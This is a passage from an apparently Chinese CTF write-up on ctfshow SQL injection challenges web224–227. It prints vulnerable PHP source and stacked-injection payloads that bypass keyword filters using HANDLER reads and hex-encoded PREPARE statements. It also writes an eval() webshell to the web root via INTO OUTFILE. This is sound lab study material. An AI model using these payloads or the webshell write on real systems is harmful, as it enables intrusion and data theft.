class="hljs-string">'password'</span>]===<span class="hljs-variable">$user_password</span>){<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'login'</span>]=<span class="hljs-string">"y"</span>;<br><span class="hljs-variable">$result</span>= <span class="hljs-string">"success"</span>;<br>}<span class="hljs-keyword">else</span>{<br><span class="hljs-variable">$result</span>= <span class="hljs-string">"error"</span>;<br>}<br>}<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$result</span>;<br>}<br></code></pre></td></tr></tbody></table></figure><p>upload.php</p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">"file"</span>][<span class="hljs-string">"error"</span>] &gt; <span class="hljs-number">0</span>)<br>{<br><span class="hljs-keyword">die</span>(<span class="hljs-string">"Return Code: "</span> . <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">"file"</span>][<span class="hljs-string">"error"</span>] . <span class="hljs-string">"&lt;br /&gt;"</span>);<br>}<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">"file"</span>][<span class="hljs-string">"size"</span>]&gt;<span class="hljs-number">10</span>*<span class="hljs-number">1024</span>){<br><span class="hljs-keyword">die</span>(<span class="hljs-string">"文件过大: "</span> .(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">"file"</span>][<span class="hljs-string">"size"</span>] / <span class="hljs-number">1024</span>) . <span class="hljs-string">" Kb&lt;br /&gt;"</span>);<br>}<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-string">"upload/"</span> . <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">"file"</span>][<span class="hljs-string">"name"</span>]))<br>      {<br>      <span class="hljs-keyword">echo</span> <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">"file"</span>][<span class="hljs-string">"name"</span>] . <span class="hljs-string">" already exists. "</span>;<br>      }<br>    <span class="hljs-keyword">else</span><br>      {<br>  <span class="hljs-variable">$filename</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">1</span>,<span class="hljs-number">10000</span>))).<span class="hljs-string">".zip"</span>;<br>      <span class="hljs-variable">$filetype</span> = (<span class="hljs-keyword">new</span> finfo)-&gt;<span class="hljs-title function_ invoke__">file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">'file'</span>][<span class="hljs-string">'tmp_name'</span>]);<br>      <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">"/image|png|bmap|jpg|jpeg|application|text|audio|video/i"</span>,<span class="hljs-variable">$filetype</span>)){<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">"file type error"</span>);<br>      }<br>  <span class="hljs-variable">$filepath</span> = <span class="hljs-string">"upload/"</span>.<span class="hljs-variable">$filename</span>;<br>  <span class="hljs-variable">$sql</span> = <span class="hljs-string">"INSERT INTO file(filename,filepath,filetype) VALUES ('"</span>.<span class="hljs-variable">$filename</span>.<span class="hljs-string">"','"</span>.<span class="hljs-variable">$filepath</span>.<span class="hljs-string">"','"</span>.<span class="hljs-variable">$filetype</span>.<span class="hljs-string">"');"</span>;<br>      <span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">"file"</span>][<span class="hljs-string">"tmp_name"</span>],<br>      <span class="hljs-string">"upload/"</span> . <span class="hljs-variable">$filename</span>);<br>  <span class="hljs-variable">$con</span> = <span class="hljs-title function_ invoke__">mysqli_connect</span>(<span class="hljs-string">"localhost"</span>,<span class="hljs-string">"root"</span>,<span class="hljs-string">"root"</span>,<span class="hljs-string">"ctf"</span>);<br><span class="hljs-keyword">if</span> (!<span class="hljs-variable">$con</span>)<br>{<br><span class="hljs-keyword">die</span>(<span class="hljs-string">'Could not connect: '</span> . <span class="hljs-title function_ invoke__">mysqli_error</span>());<br>}<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">mysqli_multi_query</span>(<span class="hljs-variable">$con</span>, <span class="hljs-variable">$sql</span>)) {<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">"location:filelist.php"</span>);<br>} <span class="hljs-keyword">else</span> {<br><span class="hljs-keyword">echo</span> <span class="hljs-string">"Error: "</span> . <span class="hljs-variable">$sql</span> . <span class="hljs-string">"&lt;br&gt;"</span> . <span class="hljs-title function_ invoke__">mysqli_error</span>(<span class="hljs-variable">$con</span>);<br>}<br> <br><span class="hljs-title function_ invoke__">mysqli_close</span>(<span class="hljs-variable">$con</span>);<br><br>      }<br>    <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure><p>堆叠注入</p><h3 id="web225"><a href="#web225" class="headerlink" title="web225"></a>web225</h3><figure class="highlight reasonml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-keyword">if</span>(preg<span class="hljs-constructor">_match('<span class="hljs-operator">/</span><span class="hljs-params">file</span>|<span class="hljs-params">into</span>|<span class="hljs-params">dump</span>|<span class="hljs-params">union</span>|<span class="hljs-params">select</span>|<span class="hljs-params">update</span>|<span class="hljs-params">delete</span>|<span class="hljs-params">alter</span>|<span class="hljs-params">drop</span>|<span class="hljs-params">create</span>|<span class="hljs-params">describe</span>|<span class="hljs-params">set</span><span class="hljs-operator">/</span><span class="hljs-params">i</span>',$<span class="hljs-params">username</span>)</span>){<br>    die(json<span class="hljs-constructor">_encode($<span class="hljs-params">ret</span>)</span>);<br>  }<br></code></pre></td></tr></tbody></table></figure><p>测试发现<code>username=ctfshow';--%0a</code>可以正常回显。</p><p>注意到注入语句存在分号，尝试堆叠注入</p><figure class="highlight apache"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ctfshow</span>';show%<span class="hljs-number">0</span>atables;--%<span class="hljs-number">0</span>a<br></code></pre></td></tr></tbody></table></figure><p>回显：</p><figure class="highlight css"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">{"<span class="hljs-selector-tag">code</span>":<span class="hljs-number">0</span>,<span class="hljs-string">"msg"</span>:<span class="hljs-string">"\u67e5\u8be2\u6210\u529f"</span>,<span class="hljs-string">"count"</span>:<span class="hljs-number">1</span>,<span class="hljs-string">"data"</span>:[{"id":<span class="hljs-string">"1"</span>,<span class="hljs-string">"username"</span>:<span class="hljs-string">"ctfshow"</span>,<span class="hljs-string">"pass"</span>:<span class="hljs-string">"ctfshow"</span>},{"Tables_in_ctfshow_web":<span class="hljs-string">"ctfshow_flagasa"</span>},{"Tables_in_ctfshow_web":<span class="hljs-string">"ctfshow_user"</span>}]}<br></code></pre></td></tr></tbody></table></figure><p>猜测这里的ctfshow_flagasa表存在flag</p><figure class="highlight apache"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">username</span>=ctfshow%<span class="hljs-number">27</span>;show%<span class="hljs-number">0</span>acolumns%<span class="hljs-number">0</span>afrom%<span class="hljs-number">0</span>actfshow_flagasa;--%<span class="hljs-number">0</span>a<br></code></pre></td></tr></tbody></table></figure><p>注意到有一个叫做flagas的字段：</p><figure class="highlight wren"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs wren">{<span class="hljs-string">"code"</span>:<span class="hljs-number">0</span>,<span class="hljs-string">"msg"</span>:<span class="hljs-string">"\u67e5\u8be2<span class="hljs-char escape_">\u6210</span>\u529f"</span>,<span class="hljs-string">"count"</span>:<span class="hljs-number">1</span>,<span class="hljs-string">"data"</span>:[{<span class="hljs-string">"id"</span>:<span class="hljs-string">"1"</span>,<span class="hljs-string">"username"</span>:<span class="hljs-string">"ctfshow"</span>,<span class="hljs-string">"pass"</span>:<span class="hljs-string">"ctfshow"</span>},{<span class="hljs-string">"Field"</span>:<span class="hljs-string">"id"</span>,<span class="hljs-string">"Type"</span>:<span class="hljs-string">"int(11)"</span>,<span class="hljs-string">"Null"</span>:<span class="hljs-string">"NO"</span>,<span class="hljs-string">"Key"</span>:<span class="hljs-string">"PRI"</span>,<span class="hljs-string">"Default"</span>:<span class="hljs-literal">null</span>,<span class="hljs-string">"Extra"</span>:<span class="hljs-string">"auto_increment"</span>},{<span class="hljs-string">"Field"</span>:<span class="hljs-string">"flagas"</span>,<span class="hljs-string">"Type"</span>:<span class="hljs-string">"varchar(255)"</span>,<span class="hljs-string">"Null"</span>:<span class="hljs-string">"YES"</span>,<span class="hljs-string">"Key"</span>:<span class="hljs-string">""</span>,<span class="hljs-string">"Default"</span>:<span class="hljs-literal">null</span>,<span class="hljs-string">"Extra"</span>:<span class="hljs-string">""</span>},{<span class="hljs-string">"Field"</span>:<span class="hljs-string">"info"</span>,<span class="hljs-string">"Type"</span>:<span class="hljs-string">"varchar(255)"</span>,<span class="hljs-string">"Null"</span>:<span class="hljs-string">"YES"</span>,<span class="hljs-string">"Key"</span>:<span class="hljs-string">""</span>,<span class="hljs-string">"Default"</span>:<span class="hljs-literal">null</span>,<span class="hljs-string">"Extra"</span>:<span class="hljs-string">""</span>}]}<br></code></pre></td></tr></tbody></table></figure><p>因为过滤了set和select，使用handler来查数据：</p><figure class="highlight apache"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">username</span>=ctfshow%<span class="hljs-number">27</span>;handler%<span class="hljs-number">0</span>actfshow_flagasa%<span class="hljs-number">0</span>aopen%<span class="hljs-number">0</span>aas%<span class="hljs-number">0</span>ap;handler%<span class="hljs-number">0</span>ap%<span class="hljs-number">0</span>aread%<span class="hljs-number">0</span>afirst;--%<span class="hljs-number">0</span>a<br></code></pre></td></tr></tbody></table></figure><p>结果：</p><figure class="highlight css"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">{"<span class="hljs-selector-tag">code</span>":<span class="hljs-number">0</span>,<span class="hljs-string">"msg"</span>:<span class="hljs-string">"\u67e5\u8be2\u6210\u529f"</span>,<span class="hljs-string">"count"</span>:<span class="hljs-number">1</span>,<span class="hljs-string">"data"</span>:[{"id":<span class="hljs-string">"1"</span>,<span class="hljs-string">"username"</span>:<span class="hljs-string">"ctfshow"</span>,<span class="hljs-string">"pass"</span>:<span class="hljs-string">"ctfshow"</span>},{"id":<span class="hljs-string">"1"</span>,<span class="hljs-string">"flagas"</span>:<span class="hljs-string">"ctfshow{9dc954b5-0bba-41f8-ac9e-a44d3e85adfa}"</span>,<span class="hljs-string">"info"</span>:<span class="hljs-string">"you get it"</span>}]}<br></code></pre></td></tr></tbody></table></figure><h3 id="web226"><a href="#web226" class="headerlink" title="web226"></a>web226</h3><figure class="highlight reasonml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-keyword">if</span>(preg<span class="hljs-constructor">_match('<span class="hljs-operator">/</span><span class="hljs-params">file</span>|<span class="hljs-params">into</span>|<span class="hljs-params">dump</span>|<span class="hljs-params">union</span>|<span class="hljs-params">select</span>|<span class="hljs-params">update</span>|<span class="hljs-params">delete</span>|<span class="hljs-params">alter</span>|<span class="hljs-params">drop</span>|<span class="hljs-params">create</span>|<span class="hljs-params">describe</span>|<span class="hljs-params">set</span>|<span class="hljs-params">show</span>|\(<span class="hljs-operator">/</span><span class="hljs-params">i</span>',$<span class="hljs-params">username</span>)</span>){<br>    die(json<span class="hljs-constructor">_encode($<span class="hljs-params">ret</span>)</span>);<br>  }<br></code></pre></td></tr></tbody></table></figure><p>和225相比，增加了过滤show,以下语句回显正常</p><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">username</span>=user1';--%0a<br>{<span class="hljs-string">"code"</span>:0,<span class="hljs-string">"msg"</span>:<span class="hljs-string">"\u67e5\u8be2\u6210\u529f"</span>,<span class="hljs-string">"count"</span>:1,<span class="hljs-string">"data"</span>:[{<span class="hljs-string">"id"</span>:<span class="hljs-string">"2"</span>,<span class="hljs-string">"username"</span>:<span class="hljs-string">"user1"</span>,<span class="hljs-string">"pass"</span>:<span class="hljs-string">"111"</span>}]}<br></code></pre></td></tr></tbody></table></figure><h2 id="SQL预处理："><a href="#SQL预处理：" class="headerlink" title="SQL预处理："></a>SQL预处理：</h2><p>在SQL中，<code>PREPARE</code> 是一种用于创建预处理语句的命令。它允许在执行之前准备和编译一个SQL语句，并将其存储在数据库中供后续使用。</p><p><code>PREPARE</code> 命令的基本语法如下：</p><figure class="highlight n1ql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">PREPARE</span> statement_name <span class="hljs-keyword">FROM</span> sql_statement;<br></code></pre></td></tr></tbody></table></figure><p>其中，<code>statement_name</code> 是为预处理语句指定的名称，<code>sql_statement</code> 是要准备和编译的SQL语句。</p><p>以下是使用 <code>PREPARE</code> 命令的示例：</p><figure class="highlight n1ql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">PREPARE</span> stmt1 <span class="hljs-keyword">FROM</span> <span class="hljs-string">'SELECT * FROM customers WHERE age &gt; ? AND city = ?'</span>;<br></code></pre></td></tr></tbody></table></figure><p>在这个示例中，我们使用 <code>PREPARE</code> 命令创建了一个名为 <code>stmt1</code> 的预处理语句。该语句是一个查询语句，其中包含两个占位符 <code>?</code>，用于接收参数值。</p><p>一旦预处理语句被创建，我们可以使用 <code>EXECUTE</code> 命令来执行它，并传递参数值：</p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">EXECUTE</span> stmt1 <span class="hljs-keyword">USING</span> <span class="hljs-number">25</span>, <span class="hljs-string">'New York'</span>;<br></code></pre></td></tr></tbody></table></figure><p>在这个示例中，我们使用 <code>EXECUTE</code> 命令执行了名为 <code>stmt1</code> 的预处理语句，并传递了两个参数值：25 和 ‘New York’。数据库系统会使用预处理语句的编译版本执行查询，并返回结果。</p><p>PY:</p><p>这里使用concat来绕过select被过滤</p><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">username</span>=user1';PREPARE flag <span class="hljs-keyword">from</span> concat(<span class="hljs-string">'s'</span>,<span class="hljs-string">'elect'</span>, <span class="hljs-string">' database()'</span>);EXECUTE flag;<br></code></pre></td></tr></tbody></table></figure><p>但又因为在此题<strong>括号被过滤</strong>了，我们直接使用<strong>16进制来绕过</strong></p><figure class="highlight 1c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">user1';PREPARE+flag+from+0x<span class="hljs-number">7365</span>6c<span class="hljs-number">65637420</span>2a<span class="hljs-number">206672</span>6f6d<span class="hljs-number">206374667368</span>5f6f775f666c<span class="hljs-number">61676173</span>;EXECUTE+flag;--%0a<br></code></pre></td></tr></tbody></table></figure><h3 id="web227"><a href="#web227" class="headerlink" title="web227"></a>web227</h3><p>同web226，先查表：</p><figure class="highlight applescript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs applescript">username=user1';PREPARE+flag+<span class="hljs-keyword">from</span>+<span class="hljs-number">0x73686f77207461626c6573</span>;EXECUTE+flag;<span class="hljs-comment">--%0a</span><br><br>{<span class="hljs-string">"code"</span>:<span class="hljs-number">0</span>,<span class="hljs-string">"msg"</span>:<span class="hljs-string">"\u67e5\u8be2\u6210\u529f"</span>,<span class="hljs-string">"count"</span>:<span class="hljs-number">1</span>,<span class="hljs-string">"data"</span>:[{<span class="hljs-string">"id"</span>:<span class="hljs-string">"2"</span>,<span class="hljs-string">"username"</span>:<span class="hljs-string">"user1"</span>,<span class="hljs-string">"pass"</span>:<span class="hljs-string">"111"</span>},{<span class="hljs-string">"Tables_in_ctfshow_web"</span>:<span class="hljs-string">"ctfshow_user"</span>}]}<br></code></pre></td></tr></tbody></table></figure><p>查数据：</p><figure class="highlight sqf"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sqf">发现ctfshow_user表没有<span class="hljs-built_in">flag</span>,尝试写webshell<br></code></pre></td></tr></tbody></table></figure><p>PY:</p><figure class="highlight 1c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c">select '&lt;?php eval($_GET[1]);?&gt;' into outfile '/var/www/html/a.php'<br>username=user1';PREPARE+flag+from+0x<span class="hljs-number">7365</span>6c<span class="hljs-number">6563742027</span>3c3f<span class="hljs-number">70687020657661</span>6c<span class="hljs-number">2824</span>5f<span class="hljs-number">474554</span>5b315d293b3f3e<span class="hljs-number">272069</span>6e746f206f<span class="hljs-number">75746669</span>6c<span class="hljs-number">652027</span>2f<span class="hljs-number">766172</span>2f<span class="hljs-number">777777</span>2f<span class="hljs-number">6874</span>6d6c2f612e<span class="hljs-number">70687027</span>;EXECUTE+flag;--%0a<br></code></pre></td></tr></tbody></table></figure><p>访问a.php，发现文件写入成功，查看api/index.php</p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-11-01 14:21:03</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-11-17 02:29:43</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">require_once</span> <span class="hljs-string">"config.php"</span>;<br><span class="hljs-variable">$ua</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">'HTTP_USER_AGENT'</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">'/sqlmap/i'</span>, <span class="hljs-variable">$ua</span>)){<br><span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">"使用sqlmap是没有灵魂的"</span>)));<br><br>}<br><br><span class="hljs-variable">$id</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'username'</span>];<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$id</span>)){<br><span class="hljs-variable">$conn</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">mysqli</span>(<span class="hljs-variable">$dbhost</span>,<span class="hljs-variable">$dbuser</span>,<span class="hljs-variable">$dbpwd</span>,<span class="hljs-variable">$dbname</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">mysqli_connect_errno</span>()){<br> <span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-keyword">array</span>(<span class="hljs-title function_ invoke__">mysqli_connect_error</span>())));<br>}<br><span class="hljs-variable">$conn</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">"set name <span class="hljs-subst">$charName</span>"</span>);<br><span class="hljs-variable">$num</span> = <span class="hljs-number">1</span>;<br><span class="hljs-variable">$ret</span> = <span class="hljs-keyword">array</span>(<br><span class="hljs-string">"code"</span>=&gt;<span class="hljs-number">0</span>,<br><span class="hljs-string">"msg"</span>=&gt;<span class="hljs-string">"查询失败"</span>,<br><span class="hljs-string">"count"</span>=&gt;<span class="hljs-variable">$num</span>,<br><span class="hljs-string">"data"</span>=&gt;<span class="hljs-keyword">array</span>()<br>);<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">'/file|into|dump|union|select|update|delete|alter|drop|create|describe|set|show|\,|db/i'</span>,<span class="hljs-variable">$id</span>)){<br><span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$ret</span>));<br>}<br><br><span class="hljs-variable">$sql</span> = <span class="hljs-string">"select id,username,pass from ctfshow_user where username = '<span class="hljs-subst">{$id}</span>';"</span>;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">mysqli_multi_query</span>(<span class="hljs-variable">$conn</span>,<span class="hljs-variable">$sql</span>))<br>{<br>    <span class="hljs-keyword">do</span><br>    {<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">mysqli_store_result</span>(<span class="hljs-variable">$conn</span>))<br>        {<br>            <span class="hljs-keyword">while</span> (<span class="hljs-variable">$row</span>=<span class="hljs-title function_ invoke__">mysqli_fetch_object</span>(<span class="hljs-variable">$result</span>))<br>            {<br>            <span class="hljs-variable">$ret</span>[<span class="hljs-string">'msg'</span>]=<span class="hljs-string">'查询成功'</span>;<br><span class="hljs-title function_ invoke__">array_push</span>(<span class="hljs-variable">$ret</span>[<span class="hljs-string">'data'</span>], <span class="hljs-variable">$row</span>);<br>            }<br>            <span class="hljs-title function_ invoke__">mysqli_free_result</span>(<span class="hljs-variable">$result</span>);<br>        }<br>    }<br>    <span class="hljs-keyword">while</span> (<span class="hljs-title function_ invoke__">mysqli_next_result</span>(<span class="hljs-variable">$conn</span>));<br>}<br><span class="hljs-title function_ invoke__">mysqli_close</span>(<span class="hljs-variable">$conn</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$ret</span>);<br><br><br>}<span class="hljs-keyword">else</span>{<br><br><span class="hljs-variable">$conn</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">mysqli</span>(<span class="hljs-variable">$dbhost</span>,<span class="hljs-variable">$dbuser</span>,<span class="hljs-variable">$dbpwd</span>,<span class="hljs-variable">$dbname</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">mysqli_connect_errno</span>()){<br> <span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-keyword">array</span>(<span class="hljs-title function_ invoke__">mysqli_connect_error</span>())));<br>}<br><span class="hljs-variable">$conn</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">"set name <span class="hljs-subst">$charName</span>"</span>);<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">"select count(username) as num from ctfshow_user;"</span>;<br><span class="hljs-variable">$result</span> = <span class="hljs-variable">$conn</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-variable">$sql</span>);<br><span class="hljs-variable">$num</span> = <span class="hljs-variable">$result</span>-&gt;<span class="hljs-title function_ invoke__">fetch_object</span>()-&gt;num;<br><span class="hljs-variable">$ret</span> = <span class="hljs-keyword">array</span>(<br><span class="hljs-string">"code"</span>=&gt;<span class="hljs-number">0</span>,<br><span class="hljs-string">"msg"</span>=&gt;<span class="hljs-string">"查询失败"</span>,<br><span class="hljs-string">"count"</span>=&gt;<span class="hljs-variable">$num</span>,<br><span class="hljs-string">"data"</span>=&gt;<span class="hljs-keyword">array</span>()<br>);<br><br><span class="hljs-variable">$page</span> = <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'page'</span>]);<br><span class="hljs-variable">$limit</span> = <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'limit'</span>]);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">'/file|into|dump/i'</span>, <span class="hljs-variable">$limit</span>)){<br><span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$ret</span>));<br>}<br><br><span class="hljs-variable">$sql</span> = <span class="hljs-string">"select * from ctfshow_user limit "</span>.<span class="hljs-title function_ invoke__">intval</span>((<span class="hljs-variable">$page</span>-<span class="hljs-number">1</span>)*<span class="hljs-variable">$limit</span>).<span class="hljs-string">","</span>.<span class="hljs-variable">$limit</span>.<span class="hljs-string">";"</span>;<br><span class="hljs-variable">$result</span> = <span class="hljs-variable">$conn</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-variable">$sql</span>);<br><br><span class="hljs-keyword">while</span> (<span class="hljs-variable">$row</span> = <span class="hljs-variable">$result</span>-&gt;<span class="hljs-title function_ invoke__">fetch_object</span>()){<br><span class="hljs-variable">$ret</span>[<span class="hljs-string">'msg'</span>]=<span class="hljs-string">'查询成功'</span>;<br><span class="hljs-title function_ invoke__">array_push</span>(<span class="hljs-variable">$ret</span>[<span class="hljs-string">'data'</span>], <span class="hljs-variable">$row</span>);<br>}<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$ret</span>);<br>}<br></code></pre></td></tr></tbody></table></figure><p>config.php</p><figure class="highlight arcade"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-symbol">$d</span>bhost =<span class="hljs-string">"127.0.0.1"</span>;<br><span class="hljs-symbol">$d</span>buser = <span class="hljs-string">"root"</span>;<br><span class="hljs-symbol">$d</span>bpwd = <span class="hljs-string">"root"</span>;<br><span class="hljs-symbol">$d</span>bname = <span class="hljs-string">"ctfshow_web"</span>;<br><span 